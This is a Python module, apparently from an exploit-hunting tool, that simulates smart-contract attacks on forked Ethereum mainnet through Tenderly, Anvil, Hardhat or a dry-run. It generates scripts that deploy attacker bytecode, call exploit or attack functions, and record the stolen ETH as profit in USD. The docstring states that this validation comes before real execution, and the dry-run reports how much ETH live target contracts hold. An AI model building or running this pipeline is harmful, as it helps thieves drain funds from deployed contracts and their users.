r"""T3-3 Fork Validator - Zero-cost exploit validation.

Validates exploits against forked mainnet state before real execution.
Methods: Tenderly API -> Anvil fork -> Web3 dry-run.

Improved: Added Anvil (Foundry) support which is faster and more
reliable than Hardhat forks. Also added impersonation for whale
funding and balance assertion checks.
"""
import json
import os
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional, List

from web3 import Web3

from .config import CHAINS, ETH_PRICE_USD


@dataclass
class ForkValidationResult:
    success: bool
    profit_eth: float = 0
    profit_usd: float = 0
    gas_used: int = 0
    gas_cost_eth: float = 0
    tx_hash: str = ''
    error: str = ''
    method: str = 'dryrun'
    logs: list = field(default_factory=list)
    balance_before: float = 0
    balance_after: float = 0

    def to_dict(self):
        return {
            'success': self.success,
            'profit_eth': self.profit_eth,
            'profit_usd': self.profit_usd,
            'gas_used': self.gas_used,
            'gas_cost_eth': self.gas_cost_eth,
            'tx_hash': self.tx_hash,
            'error': self.error,
            'method': self.method,
            'balance_before': self.balance_before,
            'balance_after': self.balance_after,
        }


class ForkValidator:
    """Validate exploits on forked mainnet at zero cost."""

    def __init__(self):
        self.tenderly_api_key = os.getenv('TENDERLY_API_KEY', '')
        self.tenderly_project = os.getenv('TENDERLY_PROJECT', '')
        self._has_anvil = self._check_anvil()
        self._has_hardhat = self._check_hardhat()

    def _check_anvil(self) -> bool:
        try:
            r = subprocess.run(['anvil', '--version'],
                               capture_output=True, text=True, timeout=5)
            return r.returncode == 0
        except Exception:
            return False

    def _check_hardhat(self) -> bool:
        try:
            r = subprocess.run(['npx', 'hardhat', '--version'],
                               capture_output=True, text=True, timeout=15)
            return r.returncode == 0
        except Exception:
            return False

    def validate(self, chain_id: int, finding: dict,
                 attacker_bytecode: str, attacker_abi: list,
                 constructor_args: list = None,
                 attack_calldata: str = '',
                 check_balance_address: str = None) -> ForkValidationResult:
        """Try validation methods in order: Tenderly -> Anvil -> Hardhat -> Dry-run."""

        # Method 1: Tenderly Simulation API
        if self.tenderly_api_key:
            result = self._validate_tenderly(
                chain_id, attacker_bytecode, attacker_abi,
                constructor_args, attack_calldata, check_balance_address
            )
            if result:
                return result

        # Method 2: Anvil fork (Foundry - fastest, most reliable)
        if self._has_anvil:
            result = self._validate_anvil_fork(
                chain_id, finding, attacker_bytecode, attacker_abi,
                constructor_args, attack_calldata, check_balance_address
            )
            if result:
                return result

        # Method 3: Hardhat local fork
        if self._has_hardhat:
            result = self._validate_hardhat_fork(
                chain_id, finding, attacker_bytecode, attacker_abi,
                constructor_args, attack_calldata, check_balance_address
            )
            if result:
                return result

        # Method 4: Web3 dry-run (gas estimation only)
        return self._validate_dryrun(chain_id, finding, attacker_bytecode)

    def _validate_anvil_fork(self, chain_id, finding, bytecode, abi,
                               constructor_args, attack_calldata, check_addr):
        """Use Anvil (Foundry) local fork for fast validation.

        Anvil is ~5x faster than Hardhat for fork operations and
        supports more reliable state manipulation.
        """
        chain = CHAINS.get(chain_id)
        if not chain:
            return None

        rpc = chain.get('rpc', '')
        target = self._extract_target(finding)

        abi_json = json.dumps(abi)
        args_json = json.dumps(constructor_args or [])

        # Encode constructor args into deployment bytecode
        ctor_suffix = ''
        if constructor_args:
            try:
                from eth_abi import encode
                ctor_types = ['address'] * len(constructor_args)
                ctor_suffix = encode(ctor_types, constructor_args).hex()
            except Exception:
                ctor_suffix = ''

        # Create a Foundry test script
        test_script = f'''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IAttacker {{
    function attack(uint256 amount) external;
    function exploit() external;
    function exploitWithdraw() external;
    function exploitInitialize() external;
    function exploitOwnership() external;
    function sweepETH() external;
}}

contract ForkTest is Test {{
    address constant TARGET = address({target});
    address constant WHALE = 0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8;

    function setUp() public {{
        vm.createSelectFork("{rpc}");
    }}

    function test_exploit() public {{
        // Fund our attacker
        vm.prank(WHALE);
        payable(address(this)).transfer(10 ether);

        // Check target balance before
        uint256 balBefore = address(TARGET).balance;
        console.log("TARGET_BAL_BEFORE:", balBefore);

        // Deploy attacker with constructor args encoded in bytecode
        bytes memory bytecode = hex"{bytecode}{ctor_suffix}";
        address attackerAddr;
        assembly {{
            attackerAddr := create(0, add(bytecode, 32), mload(bytecode))
        }}
        require(attackerAddr != address(0), "Deploy failed");
        console.log("ATTACKER:", attackerAddr);

        // Fund attacker
        payable(attackerAddr).transfer(1 ether);

        // Try exploit
        IAttacker attacker = IAttacker(attackerAddr);
        try attacker.exploit() {{
            console.log("EXPLOIT:SUCCESS");
        }} catch {{
            try attacker.attack(1000000) {{
                console.log("EXPLOIT:SUCCESS");
            }} catch {{
                console.log("EXPLOIT:FAILED");
            }}
        }}

        // Check profit
        uint256 balAfter = address(TARGET).balance;
        uint256 attackerBal = attackerAddr.balance;
        console.log("TARGET_BAL_AFTER:", balAfter);
        console.log("PROFIT:", attackerBal);
    }}
}}
'''

        try:
            with tempfile.TemporaryDirectory(prefix='vulnhunt_anvil_') as tmpdir:
                # Create foundry.toml
                foundry_toml = Path(tmpdir) / 'foundry.toml'
                foundry_toml.write_text('[profile.default]\nlibs = ["lib"]\n')

                # Write test
                test_file = Path(tmpdir) / 'test/ForkTest.sol'
                test_file.parent.mkdir(parents=True, exist_ok=True)
                test_file.write_text(test_script)

                # Install forge-std if needed
                libs_dir = Path(tmpdir) / 'lib'
                libs_dir.mkdir(exist_ok=True)
                if not (libs_dir / 'forge-std').exists():
                    subprocess.run(
                        ['forge', 'install', 'foundry-rs/forge-std', '--no-commit'],
                        capture_output=True, timeout=30, cwd=tmpdir
                    )

                # Run test
                result = subprocess.run(
                    ['forge', 'test', '-vv', '--fork-url', rpc],
                    capture_output=True, text=True, timeout=120,
                    cwd=tmpdir,
                )

                output = result.stdout + result.stderr
                success = 'EXPLOIT:SUCCESS' in output and 'test result: ok' in output
                profit = 0.0
                gas_used = 0

                for line in output.split('\n'):
                    if line.strip().startswith('PROFIT:'):
                        try:
                            profit = float(line.split('PROFIT:')[1].strip())
                        except (ValueError, IndexError):
                            pass

                # Extract gas from forge output
                import re
                gas_match = re.search(r'gas\s+used:\s*([\d,]+)', output)
                if gas_match:
                    gas_used = int(gas_match.group(1).replace(',', ''))

                return ForkValidationResult(
                    success=success,
                    profit_eth=profit,
                    profit_usd=profit * ETH_PRICE_USD,
                    gas_used=gas_used,
                    method='anvil_fork',
                    error='' if success else output[-500:],
                    logs=output.split('\n'),
                )

        except subprocess.TimeoutExpired:
            return ForkValidationResult(
                success=False, error='Anvil fork timed out', method='anvil_fork',
            )
        except Exception as e:
            return ForkValidationResult(
                success=False, error=f'Anvil error: {e}', method='anvil_fork',
            )

    def _validate_tenderly(self, chain_id, bytecode, abi,
                            constructor_args, attack_calldata, check_addr):
        """Use Tenderly Simulation API for zero-cost validation."""
        chain = CHAINS.get(chain_id)
        if not chain:
            return None

        url = 'https://api.tenderly.co/api/v1/simulations'
        headers = {
            'Content-Type': 'application/json',
            'X-Access-Key': self.tenderly_api_key,
        }

        ctor_data = ''
        if constructor_args:
            try:
                from eth_abi import encode
                ctor_types = ['address'] * len(constructor_args)
                ctor_data = encode(ctor_types, constructor_args).hex()
            except Exception:
                ctor_data = ''

        full_bytecode = bytecode + ctor_data if ctor_data else bytecode

        payload = {
            'network_id': str(chain_id),
            'from': '0x' + '00' * 20,
            'to': None,
            'input': full_bytecode,
            'gas': 10000000,
            'gas_price': 0,
            'save': True,
            'save_if_fails': True,
            'simulation_type': 'full',
        }

        try:
            import requests
            r = requests.post(url, json=payload, headers=headers, timeout=60)
            if r.status_code == 200:
                data = r.json()
                tx_info = data.get('transaction', {})
                return ForkValidationResult(
                    success=tx_info.get('status', False) == 'success',
                    gas_used=tx_info.get('gas_used', 0),
                    gas_cost_eth=0,
                    tx_hash=data.get('simulation', {}).get('id', ''),
                    method='tenderly',
                )
            else:
                return ForkValidationResult(
                    success=False,
                    error=f'Tenderly API {r.status_code}: {r.text[:200]}',
                    method='tenderly',
                )
        except Exception as e:
            return ForkValidationResult(
                success=False, error=f'Tenderly error: {e}', method='tenderly',
            )

    def _validate_hardhat_fork(self, chain_id, finding, bytecode, abi,
                                 constructor_args, attack_calldata, check_addr):
        """Use Hardhat local fork for validation."""
        chain = CHAINS.get(chain_id)
        if not chain:
            return None

        rpc = chain.get('rpc', '')
        target = self._extract_target(finding)

        abi_json = json.dumps(abi)
        args_json = json.dumps(constructor_args or [])

        test_script = f"""
const {{ ethers }} = require("hardhat");

async function main() {{
    await ethers.network.provider.request({{
        method: "hardhat_reset",
        params: [{{ forking: {{ jsonRpcUrl: "{rpc}" }} }}]
    }});

    const [signer] = await ethers.getSigners();
    console.log("SIGNER:" + signer.address);

    // Impersonate whale for funding
    const whale = "0xBE0eB53F46cd790Cd13851d5EFf43D12404d33E8";
    await ethers.network.provider.request({{
        method: "hardhat_impersonateAccount",
        params: [whale]
    }});
    const whaleSigner = await ethers.getSigner(whale);
    await whaleSigner.sendTransaction({{
        to: signer.address, value: ethers.parseEther("10.0")
    }});

    // Deploy attacker
    const Factory = new ethers.ContractFactory({abi_json}, "{bytecode}", signer);
    const attacker = await Factory.deploy(...{args_json});
    console.log("ATTACKER:" + await attacker.getAddress());

    // Check target balance before
    try {{
        const bal = await ethers.provider.getBalance("{target}");
        console.log("TARGET_BAL_BEFORE:" + ethers.formatEther(bal));
    }} catch(e) {{
        console.log("TARGET_BAL_BEFORE:0");
    }}

    // Execute exploit
    try {{
        const tx = await attacker.attack(ethers.parseEther("1000000"));
        const receipt = await tx.wait();
        console.log("GAS:" + receipt.gasUsed.toString());
        console.log("STATUS:" + (receipt.status === 1 ? "SUCCESS" : "FAILED"));

        const attackerBal = await ethers.provider.getBalance(await attacker.getAddress());
        console.log("PROFIT:" + ethers.formatEther(attackerBal));
    }} catch(e) {{
        console.log("EXPLOIT_ERROR:" + e.message.substring(0, 200));
        console.log("STATUS:FAILED");
    }}
}}

main().catch(e => {{ console.error(e); process.exit(1); }});
"""

        try:
            with tempfile.TemporaryDirectory(prefix='vulnhunt_fork_') as tmpdir:
                test_file = Path(tmpdir) / 'test_exploit.js'
                test_file.write_text(test_script)

                result = subprocess.run(
                    ['npx', 'hardhat', 'run', str(test_file)],
                    capture_output=True, text=True, timeout=120,
                    cwd=tmpdir,
                )

                output = result.stdout + result.stderr
                success = 'STATUS:SUCCESS' in output
                profit = 0.0
                gas_used = 0

                for line in output.split('\n'):
                    if line.startswith('PROFIT:'):
                        try:
                            profit = float(line.split('PROFIT:')[1].strip())
                        except (ValueError, IndexError):
                            pass
                    elif line.startswith('GAS:'):
                        try:
                            gas_used = int(line.split('GAS:')[1].strip())
                        except (ValueError, IndexError):
                            pass

                return ForkValidationResult(
                    success=success,
                    profit_eth=profit,
                    profit_usd=profit * ETH_PRICE_USD,
                    gas_used=gas_used,
                    method='hardhat_fork',
                    error='' if success else output[-500:],
                    logs=output.split('\n'),
                )

        except subprocess.TimeoutExpired:
            return ForkValidationResult(
                success=False, error='Hardhat fork timed out', method='hardhat_fork',
            )
        except Exception as e:
            return ForkValidationResult(
                success=False, error=f'Hardhat error: {e}', method='hardhat_fork',
            )

    def _validate_dryrun(self, chain_id, finding, bytecode):
        """Dry-run: gas estimation + target balance check on real chain."""
        chain = CHAINS.get(chain_id)
        if not chain:
            return ForkValidationResult(
                success=False, error='Unknown chain', method='dryrun',
            )

        try:
            w3 = Web3(Web3.HTTPProvider(
                chain['rpc'], request_kwargs={'timeout': 15}
            ))
            if not w3.is_connected():
                return ForkValidationResult(
                    success=False, error='RPC connection failed', method='dryrun',
                )

            try:
                deploy_gas = w3.eth.estimate_gas({
                    'from': '0x' + '00' * 20,
                    'data': bytecode,
                })
            except Exception as e:
                return ForkValidationResult(
                    success=False,
                    error=f'Deploy gas estimation failed: {e}',
                    method='dryrun',
                )

            gas_price = chain.get('gas_price_gwei', 10)
            deploy_cost_eth = deploy_gas * gas_price / 1e9

            target = self._extract_target(finding)
            target_eth = 0
            if target:
                try:
                    target_bal = w3.eth.get_balance(
                        Web3.to_checksum_address(target)
                    )
                    target_eth = float(w3.from_wei(target_bal, 'ether'))
                except Exception:
                    pass

            if target_eth > 0:
                print(f'[FORK] Target {target[:10]}... holds '
                      f'{target_eth:.4f} ETH (${target_eth * ETH_PRICE_USD:.2f})')

            print(f'[FORK] Deploy gas: {deploy_gas:,} | '
                  f'Cost: {deploy_cost_eth:.6f} ETH (${deploy_cost_eth * ETH_PRICE_USD:.4f})')

            return ForkValidationResult(
                success=True,
                gas_used=deploy_gas,
                gas_cost_eth=deploy_cost_eth,
                method='dryrun',
            )
        except Exception as e:
            return ForkValidationResult(
                success=False, error=f'Dryrun error: {e}', method='dryrun',
            )

    def _extract_target(self, finding: dict) -> str:
        loc = finding.get('location', '')
        if loc and ':' in loc:
            return loc.split(':')[0][:42]
        return loc[:42] if loc else ''
